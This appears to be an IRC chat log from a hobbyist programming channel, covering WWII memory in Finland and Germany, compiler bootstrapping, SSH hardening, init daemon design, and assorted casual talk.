Jun 21 14:15:32 <nortti>	"Gentlemen, I don’t know whether we are going to make history tomorrow, but at any rate we shall change geography" :D:
Jun 21 14:16:07 <vehk>	And I can see people nowadays arguing that you shouldn't show this to people (ie the actual images)
Jun 21 14:16:16 <nortti>	mh
Jun 21 14:16:26 <vehk>	But war also changed considerably regarding the media
Jun 21 14:16:59 <vehk>	I remember seeing the footage that was released of the air raid that hit civilians - and honestly it just looks like a video game
Jun 21 14:17:06 <nortti>	mh
Jun 21 14:17:23 <vehk>	Plus you now have stuff like Battlefield 1, and well, I don't know
Jun 21 14:17:51 <nortti>	also the prevalence of such pictures if you do seek them out, nowadays you can go to youtube or liveleaks and get videos from fighting by your favourite terrorist organization
Jun 21 14:17:55 <vehk>	Yeah
Jun 21 14:18:40 <nortti>	but one interesting thing re. that description of the book, it is rarely that disease is really brough up as a killer among soldiers
Jun 21 14:18:46 <vehk>	True, yes
Jun 21 14:19:21 <nortti>	dying from a bullet you can valorize, blowing up too, but shitting yourself out of water is harder to make into heroism
Jun 21 14:20:39 <nortti>	I do wonder, to what extent disease is still a problem for armies nowadays
Jun 21 14:23:13 <vehk>	Mh, yeah, that would be interesting. Mostly what you can read about today are the psychological effects
Jun 21 14:24:20 <nortti>	right. on the other hand, the amount of non-state armed groups is really on the rise, and their perspectives are quite underreported
Jun 21 14:24:26 <vehk>	True
Jun 21 14:25:49 <vehk>	Yeah, it's just so eerie every time to me how cleanly war (and especially armies/joining armies) is represented here
Jun 21 14:26:10 <vehk>	I mean, it has to, but it's just really perverted
Jun 21 14:27:37 <vehk>	And then I remember that people are upset that there's going to be women in Battlefield V...
Jun 21 14:27:52 <nortti>	finnish military uses stuff like this: https://skannaamua.files.wordpress.com/2013/10/savedpicture-20131017212759.jpg https://images.cdn.yle.fi/image/upload/w_1200,h_675,g_center,g_faces,c_fill/13-3-6811120.jpg https://puolustusvoimat.fi/documents/1948673/2014918/PEVIESTOS_Eturivinosaajia1.jpg/fbb0c522-f3f8-499a-b9ad-f9ca3c1c04c7?t=1494926817485

Jun 21 14:28:40 <nortti>	and they don't even have to get people to join, most of male population is forced to do it anyways
Jun 21 14:29:07 <vehk>	ah, welp
Jun 21 14:30:26 <vehk>	"follow the Bundeswehr on snapchat." ah yes...
Jun 21 14:30:59 <vehk>	What's next? Bundeswehr loss memes?
Jun 21 14:31:10 <nortti>	:D:
Jun 21 14:32:30 <vehk>	It's eerie enough to have the police here have twitter accounts
Jun 21 14:32:54 <zgrep>	That's a pretty common occurrence now, I think.
Jun 21 14:33:05 <vehk>	"investigating a stolen bicycle send tweet"
Jun 21 14:33:51 <nortti>	actually, recently an internal PR memo by the military got acquired by journalists. it was the "general lines" thing (more specific ones are apparently secret. this might be illegal), included stuff like trying to avoid in public conversation questions like why is the military getting more money when all social programs are cut, trying to make politicians buy the story that unless military gets more 
Jun 21 14:33:58 <nortti>	resources (both weapons and money) then by 2020 finnish national defences will collapse, etc.
Jun 21 14:34:33 <nortti>	vehk: do you have over there the reality TV programs where you follow the work of a police patrol?
Jun 21 14:34:39 <vehk>	Bah, yes
Jun 21 14:34:41 <vehk>	don't even remind me
Jun 21 14:35:16 <vehk>	Although yeah, there seems to be a common narrative of "we need more military spending because otherwise we can't defend ourselves"
Jun 21 14:35:28 *	nanovad points at US
Jun 21 14:35:56 <nortti>	oh and also to avoid attention being drawn to military spying when it comes to the new spying laws they were going to weaken constitutional protections for
Jun 21 14:36:03 <nanovad>	Troubles is, when you have a big enough hammer, everything looks like it needs to be hammered
Jun 21 14:36:03 <vehk>	oh dear
Jun 21 14:37:27 <nortti>	(that kinda both really did and did not work. helsingin sanomat released a big article about a spying facility by the military, intended to be a part of a series. they got raided by the police and received so much negative feedback from readers they dropped it altogether)
Jun 21 14:37:47 <vehk>	Huh
Jun 21 14:37:49 <vehk>	Why the negative feedback?
Jun 21 14:38:18 <nortti>	because why is this newspaper attacking the military and compromising our national security like this
Jun 21 14:38:23 <vehk>	Oh, ah, dang
Jun 21 14:38:38 <nortti>	like, most finns *really* trust the military
Jun 21 14:38:46 <vehk>	Yeah... not so much the case here
Jun 21 14:38:51 <vehk>	For maybe obvious reasons
Jun 21 14:38:56 <nortti>	heh…
Jun 21 14:38:58 <vehk>	Although that's changing as well
Jun 21 14:39:56 <nortti>	it's funny how differently germany and finland have approached ww2. not to equate the two or anything, but, well, there was this kind of shared war effort operation barbarossa onwards
Jun 21 14:40:05 <vehk>	Mh, yes
Jun 21 14:40:23 <vehk>	Is this something that's prevalent in school?
Jun 21 14:40:31 <nortti>	how do you mean?
Jun 21 14:40:41 <vehk>	The shared war effort, holocaust, etc
Jun 21 14:40:54 <vehk>	I'd assume it's more geared towards the war with Russia
Jun 21 14:41:38 <vehk>	(if at all, I don't know how much you talk about the war in Finnish schools, and what you talk about)
Jun 21 14:41:43 <nortti>	well, in finland we don't say "the shared war effort between finland and nazi germany", we say "erillissota" which means "separate war" and I think that's disgusting
Jun 21 14:41:47 <vehk>	Ah
Jun 21 14:41:59 <vehk>	So it's very distancing, interesting
Jun 21 14:42:09 <nortti>	(this has been changing, but schools are kinda conservative here)
Jun 21 14:42:40 <nortti>	holocaust is covered, in the sense of "this happened over there on the world"
Jun 21 14:43:09 <vehk>	One thing I approve of here is how you can basically guarantee someone who's been at school to have seen and listened to a survivor of the holocaust
Jun 21 14:43:14 <nortti>	mh
Jun 21 14:43:58 <nortti>	oh and stuff like operation barbarossa was at least in my time clearly slotted on the "world history" side, even though finnish state was well involved
Jun 21 14:44:04 <vehk>	Of course what's disguting now is that alt-right ppl frequently call this a culture of shame
Jun 21 14:44:16 <vehk>	ah
Jun 21 14:45:59 <nortti>	in general, I'd say it was not hidden that germans were basing their operations in finland, but it wasn't really emphasized either, and the picture presented in the "finnish history" side was rather conspicously fully-finnish until the war of lapland, where due to pressure from USSR finnish army had to push the german army to norway
Jun 21 14:46:27 <vehk>	mmh
Jun 21 14:46:47 <vehk>	"not hidden that germans were basing their operations in finland, but it wasn't really emphasized either" reminds me of US bases in Germany nowadays
Jun 21 14:47:27 <vehk>	I'd not be surprised to find out there's US nukes here
Jun 21 14:47:37 <nortti>	it actually kinda shocked me to read manillaköysi (a finnish war novel written in the 50s), because of how clearly there was this "well, yes, of course there are germans in here"
Jun 21 14:48:03 <vehk>	Right, yeah. Even if you know about how history is presented in a skewed way, it does work subconsciously
Jun 21 14:48:12 <nortti>	yup
Jun 21 14:48:17 <vehk>	Especially if you start doing it very early on
Jun 21 14:48:27 <vehk>	Like, even just a simple "us/them" narrative
Jun 21 14:48:30 <nortti>	mh
Jun 21 14:50:52 <vehk>	I think maybe that's why I also don't like the focus on WWII so much
Jun 21 14:51:00 <nortti>	oh?
Jun 21 14:51:34 <vehk>	Like, obviously it's very easy to have a narrative going of "well, Germany did all this, and then the Allies made everything better"
Jun 21 14:51:44 <nortti>	ah
Jun 21 14:51:45 <vehk>	You never ever hear about war crimes on the side of the Allies
Jun 21 14:51:48 <nortti>	mh
Jun 21 14:52:13 <nortti>	it's also interesting how easily in trying to counteract those kinds of skew you flip far too strongly onto skew in in a different direaction
Jun 21 14:52:16 <nortti>	*direction
Jun 21 14:52:18 <vehk>	With which I want to say is that there seems to be a general problem, not something you can blame on one nation (however fucked the leadership/etc was)
Jun 21 14:52:32 <vehk>	I think it's important to recognize that this can happen anywhere, and it has
Jun 21 14:52:38 <vehk>	Mh, yeah
Jun 21 14:53:06 <vehk>	I guess I'm a bit disappointed there doesn't seem to be a more pacifist approach to all of this
Jun 21 14:53:15 <vehk>	But rather, "war is okay when the winning side does it"
Jun 21 14:53:20 <nortti>	heh
Jun 21 14:54:08 <nortti>	hm, the emphasis on germany (and hitler himself too) easily makes it into a "well they're clearly unlike us" for non-germans, thus leading to "can't happen here", how does it work from the perspective of a german?
Jun 21 14:56:07 <vehk>	I guess it goes more towards a sense of responsibility and attention/prudence
Jun 21 14:56:19 <vehk>	What you definitely don't have is someone stating that his can't ever happen again
Jun 21 14:56:24 <vehk>	It's more "don't ever let this happen again"
Jun 21 14:56:30 <nortti>	ah
Jun 21 14:56:44 <vehk>	And it's pretty direct, too
Jun 21 14:56:59 <vehk>	Possibly different for the next generations
Jun 21 14:57:29 <vehk>	People who have been in the war... hm. They're not going to be there much anymore in 10-20 years
Jun 21 14:57:45 <nortti>	right
Jun 21 14:59:13 <vehk>	Of course with all this also comes a very western-centric idea. The usual "hey, we have Democracy now, and it's amazing"
Jun 21 14:59:19 <vehk>	And "look at the constituation, it's really good"
Jun 21 14:59:35 <vehk>	I mean, I don't know, I guess you can't really say that everything is fucked
Jun 21 15:00:22 <vehk>	Was easier to say all these things back when I was in school
Jun 21 15:00:27 <vehk>	I bet it's more difficult now
Jun 21 15:00:32 <nortti>	mh
Jun 21 15:00:42 <vehk>	I remember an essay I had to write about the future of the EU and whether the EU was a good idea
Jun 21 15:00:58 <vehk>	Funny, now with Brexit and all - would now be a different kind of essay
Jun 21 15:01:29 <vehk>	Plus the migrant crisis, that wasn't a thing back when I was in school
Jun 21 15:01:41 <vehk>	I guess what I mostly got was the war on terrorism, that was big then
Jun 21 15:02:40 <vehk>	What I do definitely know is that if I were to voice anarchist ideas, I'd be shot down by the teacher 100%
Jun 21 15:02:55 <nortti>	out of interest, what kind of story do you have of democracy in germany? in finland it starts at the diet of porvoo during autonomy, then next up is the establishment of parliament in 1906, the civil war of 1918 where in the end democratical system prevailed
Jun 21 15:03:30 <vehk>	Mainly Weimar Republic, then the current constitution
Jun 21 15:04:00 <vehk>	Oh, also of course a big part on how Hitler gained power and whether that power was obtained "legally"
Jun 21 15:04:16 <vehk>	But mostly the current constitution is very very distant from all that
Jun 21 15:06:06 <vehk>	There is actually a very big part on how the first article of the constituation is "Human dignity shall be inviolable"
Jun 21 15:06:11 <vehk>	Which comes before Personal Freedoms
Jun 21 15:06:19 <nortti>	quite likely the far-right movements of 1920s and 30s, there may or may not be a point of the post-war situation where USSR mainly ran the allied control commission and then later finnish communists had influence in the state ('years of danger'), also possibly kekkonen's five(?) terms and dissolutions of government. but not always, I remember from basic school it seemed like there were no thereats to the 
Jun 21 15:06:25 <nortti>	system 30s onwards
Jun 21 15:06:28 <nortti>	mh
Jun 21 15:06:50 <vehk>	mh, I see
Jun 21 15:07:09 <vehk>	There's actually very little here about occupied Germany - the constitution just somewhat pops into existence
Jun 21 15:07:17 <nortti>	oh, interesting
Jun 21 15:07:35 <nortti>	is denazification covered?
Jun 21 15:07:43 <vehk>	Not much, actually
Jun 21 15:08:02 <CompanionCube>	doesn't germany even have a explicit right of resistance in the thing?
Jun 21 15:08:16 <vehk>	Oh, it says "no freedom to enemies of freedom"
Jun 21 15:08:24 <vehk>	I think you mean that anyway
Jun 21 15:08:32 <CompanionCube>	nope
Jun 21 15:08:35 <vehk>	Hm.
Jun 21 15:08:56 <vehk>	Let's see
Jun 21 15:10:15 <vehk>	"Gegen jeden, der es unternimmt, diese Ordnung zu beseitigen, haben alle Deutschen das Recht zum Widerstand, wenn andere Abhilfe nicht möglich ist."
Jun 21 15:10:17 <vehk>	This one, second
Jun 21 15:10:44 <vehk>	"All Germans shall have the right to resist any person seeking to abolish this constitutional order, if no other remedy is available."
Jun 21 15:11:41 <CompanionCube>	that's the one
Jun 21 15:12:06 <vehk>	Then you also have the eternity clause which says that you can't ever remove certain fundamental rights (ie the first 20 articles iirc)
Jun 21 15:12:29 <vehk>	But honestly the first 20 contain an article that says that there shall be no censorship
Jun 21 15:12:32 <vehk>	I mean it's all hogwash
Jun 21 15:14:16 <vehk>	(Especially considering what the EU just passed)
Jun 21 15:14:24 <vehk>	If that's not censorship then I don't know

Jun 22 06:23:36 <S_Gautam>	OS 9 is where the second generation ends
Jun 22 06:23:36 <nortti>	it just ran a lot through the m68k emulator
Jun 22 06:24:00 <puckipedia>	S_Gautam: so the "generation end" is interesting
Jun 22 06:24:24 <puckipedia>	the Macintosh Classic I have can also run system 7, so it's definitely not quite there
Jun 22 06:24:27 <S_Gautam>	and OS X 10.8 is where the "modern" (post 2010 Mac) seems to start.
Jun 22 06:24:43 <puckipedia>	I'd put the "modern" mac barrier at about 10.4, where intel happened

Jun 22 06:26:01 <S_Gautam>	especially windows 10
Jun 22 06:26:01 <puckipedia>	I really prefer the mac os 7 (including appearance manager) through mac os 9 look
Jun 22 06:36:56 <nortti>	oh huh, interesting that os x went back to the flat dock in more recent versions
Jun 22 06:38:02 <nortti>	my favourite looks are probably system 1 to 6 and os x 10.4
Jun 22 06:42:06 <puckipedia>	I mean system 1-6 are also aesthetic
Jun 22 06:42:11 <puckipedia>	but slightly under 7-9 imo
Jun 22 06:46:33 <nortti>	I find it interesting you group 7 (or, at least the pre-7.6 7) with 8 and 9, I've always thought of it as its own thing, inbetween 1 to 6 and 8 to 9

Jun 23 06:19:59 <nortti>	right, the reason I'm confused is because “The most common way to express normal possession is "у + genitive possessor + есть + nominative possession."” seems to suggest that a finnish-like have is the more common one (and not necessarily in just questions)

Jun 23 12:13:19 <nortti>	< john_cephalopoda> Transhumanism = every person is transsexual ← unsure if a joke or not, but no. a belief in that humans should "transcend" their current limits through fusion with technology. (tho there are quite a few trans ppl there) (p.p.s. the term "transsexual" is kind of dated and many ppl nowadays don't really like it anymore)
Jun 23 12:14:26 <nanovad>	shikhin: niht
Jun 23 12:16:22 *	nanovad . o O ( a transhumanism story that starts with pacemakers )
Jun 23 12:17:16 <nortti>	I mean, there are arguments that ppl who use them should be considered cyborgs…
Jun 23 12:17:42 <nanovad>	heh
Jun 23 12:17:56 <nanovad>	I suppose that would depend on their reliance on it
Jun 23 12:18:24 <nanovad>	The tough part is defining what a cyborg is. Is it someone who happens to have a digital enhancement? In that case, anyone with a wrist watch is
Jun 23 12:18:46 <nanovad>	Or someone with an enhancement inside of them? Well, we have cyborg dogs with tag chips now
Jun 23 12:19:31 *	vehk starts grinding a track in Redout so they get better

Jun 23 12:21:24 <vehk>	I'm going to assume not many people play this track/class combination
Jun 23 12:21:40 <nortti>	how many tracks/classes are there?
Jun 23 12:21:43 <nanovad>	small brain: having enough RAM. normal brain: closing programs before starting a RAM intensive application. cosmic brain: closing applications as the desired program's memory use grows
Jun 23 12:22:08 <nortti>	nanovad: universe brain: 20GB of swap
Jun 23 12:22:15 <nanovad>	:D
Jun 23 12:22:44 <vehk>	nortti: 7 different ships, 4 classes per ship, maybe 30-35 tracks?
Jun 23 12:22:59 <vehk>	Then you have different race types as well
Jun 23 12:23:12 <nortti>	ah
Jun 23 12:23:12 <vehk>	For example time attack and pure time attack
Jun 23 12:23:18 <vehk>	The latter disallows powerups
Jun 23 12:23:58 <nortti>	so sth like 1800 different combinations
Jun 23 12:24:34 <vehk>	For that one race type alone, yes
Jun 23 12:24:36 *	sortie works on init(8) and writes down the exactly set of states, events, and derivation rules for how daemons change states

Jun 23 12:24:50 <john_cephalopoda>	nortti: It was a joke. Didn't know that "transsexual" is dated and not the right term any more. Sorry.

Jun 23 12:25:03 <sortie>	Fun!
Jun 23 12:25:56 <nortti>	vehk: ah, I counted two game modes there, without it it's 7*4*30 to 7*4*35, which is kinda 30², so 900
Jun 23 12:26:04 <vehk>	Oh, right, I see
Jun 23 12:26:10 <vehk>	But yeah, lots of combinations
Jun 23 12:27:05 <nortti>	sortie: will you derive the code from the model, or is it a way to check already-existing code?

Jun 23 12:27:40 <sortie>	nortti: I have a working prototype that doesn't handle all cases and I'm slightly unclear what the model is, it's a way to fully flesh out the design
Jun 23 12:27:42 <bslsk05>	​konjak.bandcamp.com: Moonlight (VS Ivory Beast) | konjak
Jun 23 12:27:49 <nortti>	mh
Jun 23 12:28:31 <sortie>	nortti: It's clear that I need to specify the behavior of all events in every state, so I can handle interesting cases like the daemon is waiting for its dependencies to start and now it's being asked to shut down
Jun 23 12:29:12 <sortie>	nortti: And then I can model check properties like "a daemon is only running if it is the root daemon or a the root daemon somehow depends on the daemon", so when the root daemon finishes, everything will shut down
Jun 23 12:29:21 <nortti>	right. how are you working on this, just a text file with state and then list of different events that's same for each, or something more fancy?
Jun 23 12:29:28 <sortie>	Yeah just textually
Jun 23 12:32:20 <sortie>	nortti: Like when I model it, I model events, and it's clear that's a pretty nice way to actually structure the code. Have a bitmask of pending events and have the state code check for them.
Jun 23 12:32:42 <sortie>	Also means events can continue to be raised and don't have to be handled immediately
Jun 23 12:33:02 <nortti>	hm, sounds good. what if two conflicting events get raised, does the mathematical model account for that?
Jun 23 12:33:35 <sortie>	I guess it does
Jun 23 12:33:52 <sortie>	I think the interpretation is that the rules have precedence in the order listed
Jun 23 12:34:00 <nortti>	mh
Jun 23 12:34:25 <nortti>	that makes reasoning a bit harder, but I can't see how that would backfire here
Jun 23 12:34:30 <nortti>	(^ famous last words)
Jun 23 12:34:58 <sortie>	nortti: I guess that if both the EVENT_REQUESTED_RUNNING and EVENT_REQUESTED_TERMINATION events happens in the DAEMON_STATE_RUNNING state, the REQUESTED event gets processed first and it returns to the DAEMON_STATE_TERMINATED, and then there's a rule for EVENT_REQUESTED_RUNNING that brings it up again
Jun 23 12:35:35 <sortie>	nortti: Well what I want to avoid is overlapping rules, that is, having two rules apply in the same situation. That would mean it's non-deterministic.
Jun 23 12:35:41 <nortti>	mh
Jun 23 12:35:52 <sortie>	So either I write the rules so they never overlap, or I just have precedence
Jun 23 12:35:59 <nortti>	right
Jun 23 12:36:08 <sortie>	Making this stuff up as I talk with you :3
Jun 23 12:36:29 <sortie>	But the important part is doing careful and precise thinking

Jun 23 13:03:19 <nortti>	oh?
Jun 23 13:03:29 <S_Gautam>	in cricket, it's mostly fixed after sometime, maximum runs per over (6 balls) is 36, so the winner/loser becomes almost certain after some play
Jun 23 13:04:08 <S_Gautam>	germany won by scoring a goal in the last seconds literally a blitz
Jun 23 13:06:11 <nortti>	doesn't the fact that a winner becomes mostly certain make it boring to watch?
Jun 23 13:06:12 <S_Gautam>	i guess it's the same thing with basketball or hockey or any game where people just have to run with a ball hmm
Jun 23 13:07:11 <S_Gautam>	nortti: cricket games are pretty long
Jun 23 13:07:29 <S_Gautam>	a "test" match lasts around 4-5 days
Jun 23 13:08:23 <S_Gautam>	a one-day-international can take a day, but these days 20 overs (120 balls to play) games are pretty popular since they mostly involve the batsmen hitting the ball carelessly and making it look more like baseball
Jun 23 13:08:42 <S_Gautam>	so, yes, it gets boring after sometime
Jun 23 13:08:52 <S_Gautam>	but that sometime can be pretty long as well
Jun 23 13:09:42 <S_Gautam>	but there's a sense of reward i guess, play carefully from the start, and it pays off, football stuff turns immediately if you do a blunder

Jun 24 09:47:59 <nortti>	had one hell of a yak shave today. emptying the dishwasher, the lower hinge of door of one of the cabinets breaks away. mother comes over, inspects the hole, we declare the old screw hole a lost cause and decide we should make a new hole, slot a screw anchor in, and put it there. first, we need to fish one of the screws up from the kitchen sink, where it had fallen when testing. we improvised this using 
Jun 24 09:48:05 <nortti>	scissors. after that, we take the door off, to avoid further damage. next, we dicover all our screw anchors are too long, so we decide to cut one shorter. since scissors couldn't quite cut it, we decide to cut it using a knife. since it doesn't stay in place when cutting with a knife, we hold it in place using another knife. the screw anchor is now short enough, time to drill a hole. we find that we do 
Jun 24 09:48:11 <nortti>	not have the correct sized drill bit (this involved looking at the old drill, which involved emptying a whole another cabinet), and decide to attempt with the next smaller. the screw anchor does not fit. we try widening the hole with the next-bigger drill bit. the screw anchor slides off. we try to see if there is a slightly thicker screw anchor. there is, and we cut it with the double-knife as before. 
Jun 24 09:48:17 <nortti>	it fits and doesn't slide off. repeat for the other hole. attach the hinge, attach door, attach door to hinge. screw around (tehee) with hinge settings a bit, since the new holes are in a new place so the old settings don't fit. turns out it's somewhat too far from the old hole for the amount of adjustment that can be done on the hinge. decide it's good enough for now. put all the things back in, get rid

Jun 24 12:27:06 <vehk>	Things you never thought you'd try: building gcc with its go compiler, because go needs bootstrapping, and the one they have you download is linked dynamically against glibc
Jun 24 13:30:15 <emily>	not sure gcc's go is new enough
Jun 24 13:30:46 <vehk>	It failed building, abandoned that way
Jun 24 13:30:53 <vehk>	I do not want to debug gcc
Jun 24 13:31:15 <vehk>	I'm now using go 1.4.3 which I can build without bootstrapping first
Jun 24 13:31:17 <emily>	" The GCC 7 releases include a complete implementation of the Go 1.8.1 user libraries. As with earlier releases, the Go 1.8 runtime is not fully merged, but that should not be visible to Go programs.
Jun 24 13:31:19 <vehk>	And use that to build the newest one
Jun 24 13:31:21 <emily>	The GCC 8 releases are expected to include a complete implementation of the Go 1.10 release, depending on release timing. The Go 1.10 runtime has now been fully merged into the GCC development sources, and concurrent garbage collection is expected to be fully supported in GCC 8. "

Jun 24 13:52:50 <vehk>	Okay, update, it was actually Gentoo who provided pre-build binaries for this
Jun 24 13:52:57 <vehk>	So I checked out Go's official binaries
Jun 24 13:53:03 <vehk>	They're dynamically linked against glibc
Jun 24 13:53:11 <vehk>	;__________________;
Jun 24 13:54:07 <john_cephalopoda>	Better than dynamically linked against an ARM64-version of dietlibc
Jun 24 13:54:23 <vehk>	I'd possibly disagree
Jun 24 13:55:05 <puckipedia>	<vehk> They're dynamically linked against glibc <- ehmm????
Jun 24 13:55:09 <puckipedia>	interesting
Jun 24 13:55:22 <puckipedia>	I thought Go generated static libs
Jun 24 13:55:56 <vehk>	It does
Jun 24 13:56:04 <vehk>	It's go itself
Jun 24 13:56:15 <puckipedia>	... is go written in go?
Jun 24 13:56:17 <vehk>	Yes
Jun 24 13:56:23 <puckipedia>	then why is it dynamically linked
Jun 24 13:56:36 <vehk>	Now that I can't answer
Jun 24 13:56:48 <vehk>	The official way™ of building go without using pre-compiled binaries...
Jun 24 13:56:55 <vehk>	is to download the old 1.4 release that still had parts in C
Jun 24 13:57:02 <vehk>	And using that to bootstrap :::DDDDDD
Jun 24 13:57:24 <puckipedia>	I guess rust is the same
Jun 24 13:57:30 <puckipedia>	though you could probably use mrustc
Jun 24 13:57:52 <puckipedia>	vehk: ok so here's my question
Jun 24 13:58:01 <puckipedia>	... how do you build gcc without pre-compiled libraries 
Jun 24 13:58:30 <vehk>	Well yes, I know where you're going with this
Jun 24 13:58:33 <CompanionCube>	you cross-compile
Jun 24 13:58:40 <puckipedia>	CompanionCube: from what
Jun 24 13:58:51 <CompanionCube>	A system that does.
Jun 24 13:58:52 <puckipedia>	all the C compilers' binaries are lost
Jun 24 13:58:58 <CompanionCube>	OK then
Jun 24 13:59:04 <CompanionCube>	grab a copy of the tcc source
Jun 24 13:59:06 <CompanionCube>	bootstrap from that
Jun 24 13:59:10 <nortti>	how?
Jun 24 13:59:20 <nortti>	traslating C by hand?
Jun 24 13:59:23 <nortti>	+n
Jun 24 13:59:32 <vehk>	Well, the way to do this is to build from scratch again for that exact platform
Jun 24 13:59:54 <vehk>	(And yes, this is an interesting discussion, but the solution here is to not have go be dynamically linked?)
Jun 24 14:00:04 <puckipedia>	yes to the latter
Jun 24 14:00:07 <CompanionCube>	nortti: any other way?
Jun 24 14:00:19 <nortti>	CompanionCube: < puckipedia> all the C compilers' binaries are lost
Jun 24 14:00:28 <vehk>	CompanionCube: Abandon software and live in the woods
Jun 24 14:00:37 <puckipedia>	anyways I mostly used this discussion to convince myself that self-bootstraping compilers are good
Jun 24 14:00:41 <puckipedia>	it worked
Jun 24 14:00:42 <CompanionCube>	I'll take that as a no then
Jun 24 14:00:45 <vehk>	puckipedia: mmh
Jun 24 14:01:02 <vehk>	CompanionCube: Well, you *can* do it, it's just not going to be nice
Jun 24 14:01:10 <puckipedia>	well, as long as it doesn't require other compilers
Jun 24 14:01:12 <vehk>	Right
Jun 24 14:01:27 <puckipedia>	like, rust is --- rust isn't statically compiled either is it
Jun 24 14:01:52 <CompanionCube>	imo self-bootstrapping works best when you have a 2nd implmentation to break the loop when neede
Jun 24 14:02:02 <puckipedia>	like for GCC
Jun 24 14:02:04 <puckipedia>	oh wait

Jun 24 14:02:13 <puckipedia>	yeah no way this is statically compiled
Jun 24 14:02:47 <vehk>	hah
Jun 24 14:03:03 <puckipedia>	hmm
Jun 24 14:03:09 *	puckipedia nix-shell -p go
Jun 24 14:03:13 <CompanionCube>	a true static compile's impossible for glibc under normal circumstances
Jun 24 14:03:24 <CompanionCube>	because of how glibc's name lookup functions
Jun 24 14:03:54 <puckipedia>	        libc.so.6 => /nix/store/27x7pinqdsl9f3rpbm8bsszd9fhwq266-glibc-2.27/lib/libc.so.6 (0x00007f5309d11000)

Jun 25 07:33:33 <zgrep>	The port thing wouldn't work super well with iptables, I think. That, and how do you stop it from colliding with an already existing service?
Jun 25 07:33:58 <zgrep>	But. Other than that, probably it'd work? I haven't read too much into it / about it.
Jun 25 07:42:50 <zgrep>	Hm. A UDP knock. Hrmph.
Jun 25 07:43:48 <zgrep>	Mmh. It'd be a fixed port, so that would be okay with iptables, I guess.

Jun 25 07:44:16 *	zgrep decides to do just that.

Jun 25 07:47:24 <zgrep>	Weird. My phone's charger charges my laptop...
Jun 25 07:48:07 <zgrep>	Ah, there we go.
Jun 25 07:48:14 <zgrep>	There's just an excruciatingly long delay for some reason.
Jun 25 07:48:30 <zgrep>	Between when I plug it in, and when it starts charging / the light turns on.
Jun 25 08:00:05 <nanovad>	Welp
Jun 25 08:00:16 <nanovad>	Arduino IRC client with tvout is a bust
Jun 25 08:01:52 <nanovad>	Apparently the display library I'm using eats up a massive chunk of the arduino's available CPU time, leaving little for interrupts and such, which I believe serial triggers. Serial buffer is too small, fills up before the Arduino gets to service it
Jun 25 08:02:20 <nanovad>	Suppose one thing I could do would be to fork the serial library and increase the buffer size from 64 to 256 bytes or something

Jun 25 08:03:39 <vehk>	Disallow root login as well, and use something like AllowGroups <user-group> in sshd_config
Jun 25 08:04:49 <nortti>	running pubkey-only is kinda interesting in how it means you always need something trusted way to add the new thing's pubkey to accepted keys
Jun 25 08:05:11 <vehk>	Right, sure, (and the oxy site even pointed this out)
Jun 25 08:05:18 <nortti>	right
Jun 25 08:05:35 <nortti>	just reminds me again of the problem of anchoring trust and such
Jun 25 08:05:39 <vehk>	Yeah
Jun 25 08:06:37 <zgrep>	nortti: I believe ahti is pubkey only.
Jun 25 08:07:12 <nortti>	indeed
Jun 25 08:07:40 <nortti>	meaning I need to hop through ayu every time I want to connect to it from a new device
Jun 25 08:50:24 <nortti>	vehk: do you know what could keep a win 7 system in the "logging off" screen for over 20 minutes
Jun 25 08:53:12 <vehk>	In my experience that's caused by updates
Jun 25 08:53:35 <vehk>	Or a program that won't close, but then you should not have got to the logging off screen at all
Jun 25 08:54:30 <vehk>	I have had Windows 10 stay in that screen forever, though
Jun 25 08:54:43 <vehk>	I never found a fix other than shutting it down instead of restarting
Jun 25 08:55:12 <vehk>	Although ever since 1803 that seems fixed
Jun 25 09:07:06 <john_cephalopoda>	vehk: I actually disallowed root login and set pubkey-only. That's why it already failed in pre-auth.
Jun 25 09:07:28 <vehk>	Figured. Port 22 is your enemy there.
Jun 25 09:09:45 <nanovad>	Switched off of port 22 and didn't have any issues after that
Jun 25 09:09:53 <nanovad>	At least when I was running Azog
Jun 25 09:10:51 <nanovad>	oh man, I love tech support requests that are no more specific than "some strange things happen"
Jun 25 09:12:29 <olsner>	Resolved "all things are now strange"
Jun 25 09:13:33 <nortti>	vehk: my father got that when shutting down. updates are a possiblity. cut power

Jun 25 09:16:32 <olsner>	fun times, settling in for a meaty task estimated at 2 days, turns out the feature was implemented years ago but just disabled (on one out of three products using the same code), so it took about 5 minutes to remove the code that disables it and it's done
Jun 25 09:17:07 <nanovad>	haha
Jun 25 09:17:25 <nanovad>	olsner: Now you find all manner of odd bugs because the code's multithreaded and fucks with state in obsolete ways

Jun 25 09:18:01 <olsner>	nah, that'll just be lost in the sea of fucky bugs
Jun 25 09:21:43 <nanovad>	:D:
Jun 25 09:23:25 <olsner>	or not really, the product actually mostly works, it's just very bad code internally
Jun 25 09:23:49 <nanovad>	What's it do?
Jun 25 09:28:34 <olsner>	it's a seed drill, so the software controls motors and hydraulics and a bunch of sensors and stuff, and has a web interface for the user
Jun 25 09:29:46 <nanovad>	ah neat
Jun 25 09:34:07 <olsner>	the code is like the perfect example of a rube goldberg architecture... I should figure out how to parse out the event dependencies that makes it tick, see what the longest chain is
Jun 25 09:39:08 <olsner>	e.g. the UI makes an rpc call to a "service" that sets a "flag" that makes an "update function" get called, which sends an "event" that's translated to another "flag" in another service that's listening to that service, etc and eventually a "frame" object that sits in an output queue has some flag set that makes it send a CAN message to another electronics box, and something moves
Jun 25 09:40:21 <nanovad>	jesus
Jun 25 09:40:37 <nanovad>	What language is it in?
Jun 25 09:40:49 <olsner>	C++, with lots of unnecessary templates
Jun 25 09:41:28 <nanovad>	ew.
Jun 25 09:41:36 *	nanovad tries to remember the last time he used templated code
Jun 25 09:44:32 <nanovad>	… why does everyone whose computers I work on assume I know all their passwords?
Jun 25 09:45:06 <nortti>	because you are a SUPER HACKER
Jun 25 09:45:08 <zgrep>	Because you do. You must.
Jun 25 09:45:29 *	zgrep . o O ( Because they don't expect security unless there's an advertisement about it. )
Jun 25 09:46:12 <nanovad>	My favorite support problems are "It's acting weird, I think there may be a virus", then you examine it and it's just misconfigured/got updated and acts differently now
Jun 25 09:46:24 <nanovad>	Which they would have been aware of, had they read the notifications instead of closing them
Jun 25 09:50:51 <olsner>	oh, some more work grievances, the Very Junior Consultant has spent a couple of days making a timer ... this afternoon he'd gotten as far as including the timer class header in the wrong file
Jun 25 09:51:26 <olsner>	(granted, adding timer support is done by inheriting a four-parameter template class in your service class as a mixin to add the required functions, so not exactly easy mode)

Jun 25 11:32:12 *	olsner . o O ( feed-three-families IDE )
Jun 25 11:32:18 <puckipedia>	you get licenses for basically everything Microsoft ever made, excluding like windows 98 (because of Java issues)
Jun 25 11:32:25 <S_Gautam>	olsner: :D:
Jun 25 11:32:26 <puckipedia>	so yes
